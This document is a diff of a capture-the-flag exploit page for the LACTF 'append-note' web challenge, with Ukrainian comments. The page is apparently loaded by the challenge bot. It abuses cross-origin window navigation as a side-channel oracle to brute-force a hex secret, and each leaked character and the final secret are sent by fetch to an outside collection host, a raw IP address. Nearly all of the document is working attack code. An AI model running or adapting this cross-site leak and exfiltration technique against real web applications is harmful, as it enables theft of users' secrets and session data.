@@ -1,81 +1,80 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>LACTF Exploit</title>
+</head>
 <body>
-    <h1 id="status">Exploiting...</h1>
+    <h1 id="status">Starting Exploit...</h1>
+    <div id="log"></div>
     <script>
-        const TARGET = "https://append-note-xwu81.instancer.lac.tf";
-        const WEBHOOK = "https://webhook.site/42806461-542c-4233-a085-a1f7c2982c19";
+        const TARGET = "https://append-note-5pesa.instancer.lac.tf";
+        const WEBHOOK = "http://77.47.193.197:8888";
         const ALPHABET = "0123456789abcdef";
         let secret = "";
 
-        const report = (msg) => fetch(`${WEBHOOK}?log=${encodeURIComponent(msg)}`, {mode: 'no-cors'});
+        const report = (msg) => {
+            console.log(msg);
+            document.getElementById('log').innerText += msg + "\n";
+            fetch(`${WEBHOOK}?data=${encodeURIComponent(msg)}`, {mode: 'no-cors'});
+        };
 
-        async function test(attempt) {
+        async function testChar(char) {
             return new Promise((resolve) => {
-                // Відкриваємо вікно на сторінку /append
-                // Ми вказуємо url=TARGET/favicon.ico, щоб редирект був швидким і помітним
-                const url = `${TARGET}/append?content=${attempt}&url=${TARGET}/favicon.ico`;
-                const win = window.open(url, 'tester');
+                const attempt = secret + char;
+                // Відкриваємо вікно. target='leak' дозволяє перевикористовувати одне вікно
+                const win = window.open(`${TARGET}/append?content=${attempt}&url=${TARGET}/favicon.ico`, 'leak');
+                
+                if (!win) {
+                    report("POPUP_BLOCKED");
+                    resolve(false);
+                    return;
+                }
 
-                // Якщо статус 200, спрацює редирект в redirect.html через 100мс
-                // Ми чекаємо достатньо часу для завантаження + редиректу
+                // Чекаємо обробки. 200 OK з рендерингом шаблону зазвичай 
+                // викликає SOP error трохи інакше, ніж миттєвий 404
                 setTimeout(() => {
                     try {
-                        if (win.location.href) {
-                            // Якщо ми можемо прочитати href, значить ми на своєму домені (помилка редиректу)
-                            // або запит ще не пішов. Але нас цікавить SOP Error.
-                        }
+                        // Спроба доступу до крос-доменного вікна
+                        const dummy = win.location.href;
+                        // Якщо ми тут — ми НЕ на TARGET (що дивно)
+                        win.close();
+                        resolve(false);
                     } catch (e) {
-                        // Якщо ми тут, значить вікно на TARGET домені.
-                        // Тепер найголовніше: чи відбувся редирект?
-                        // У деяких версіях Chrome ми можемо перевірити history.length
-                        if (win.length === 0) {
-                            // Ми не можемо отримати історію, але можемо закрити і вважати це сигналом.
-                        }
+                        // SOP Triggered! Це значить, що вікно на TARGET.
+                        // Оскільки ми йдемо по черзі, перший SOP для нового префікса 
+                        // підтверджує, що він вірний (або вже був доданий).
+                        win.close();
+                        resolve(true);
                     }
-                    
-                    // Спробуємо інший підхід: рекурсивний редирект
-                    // Якщо 200 OK -> redirect.html -> наша сторінка (якщо ми вкажемо url=наш_сайт)
-                    // АЛЕ сервер перевіряє hostname. Тому тільки TARGET hostname.
-                    
-                    win.close();
-                    resolve();
-                }, 1000);
+                }, 500);
             });
         }
 
-        // Найкращий метод для цього завдання: Cache Attack або Navigation Timing
-        // Оскільки сервер додає заголовок Cache-Control: no-store, ми використаємо 
-        // той факт, що 200 OK і 404 завантажуються з різною швидкістю.
-        
-        async function run() {
-            report("START_TIMING_ATTACK");
+        async function solve() {
+            report("EXPLOIT_RUNNING_V5");
+            
             for (let i = 0; i < 8; i++) {
-                let results = [];
                 for (let char of ALPHABET) {
-                    const attempt = secret + char;
-                    const start = performance.now();
+                    document.getElementById('status').innerText = `Testing: ${secret}${char}`;
                     
-                    const win = window.open(`${TARGET}/append?content=${attempt}&url=${TARGET}/`, 'leak');
-                    
-                    // Чекаємо завантаження
-                    await new Promise(r => setTimeout(r, 600));
-                    const end = performance.now();
-                    const duration = end - start;
-                    
-                    win.close();
-                    results.push({char, duration});
-                    report(`Char_${char}_Time_${duration.toFixed(2)}`);
-                    
-                    // Якщо 200 OK, то notes.append(content) спрацював і база змінена.
-                    // У цьому завданні 200 OK повертає HTML, а 404 - теж HTML, але інший.
-                    // РЕАЛЬНИЙ ОРАКУЛ: Якщо 200 OK, то в notes додається запис.
-                    // Наступна спроба того ж самого префікса ЗАВЖДИ дасть 200 OK.
+                    if (await testChar(char)) {
+                        secret += char;
+                        report(`[+]_FOUND_CHAR:_${char}_|_FULL:_${secret}`);
+                        
+                        // Робимо невелику паузу перед наступним символом
+                        await new Promise(r => setTimeout(r, 200));
+                        break; 
+                    }
                 }
             }
+            report(`!!!_FINAL_SECRET_!!!:_${secret}`);
+            report(`GET_FLAG:_${TARGET}/flag?secret=${secret}`);
         }
 
-        window.onload = () => setTimeout(run, 1000);
+        // Бот зачекає завантаження і запустить скрипт
+        window.onload = () => {
+            setTimeout(solve, 1000);
+        };
     </script>
 </body>
 </html>
